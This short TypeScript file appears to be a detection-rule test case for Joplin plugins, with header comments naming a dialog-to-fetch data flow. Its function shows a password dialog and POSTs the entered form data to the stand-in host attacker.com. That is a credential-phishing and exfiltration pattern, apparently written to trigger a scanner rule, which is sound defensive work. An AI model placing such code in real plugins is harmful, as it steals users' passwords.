// FROM : 
// joplin.views.dialogs.open()
// 
// TO : 
// fetch

import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    await joplin.views.dialogs.setHtml('phish_r13', '<input type="password">');
    const s1 = await joplin.views.dialogs.open('phish_r13');
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s1.formData) });
}

export {};
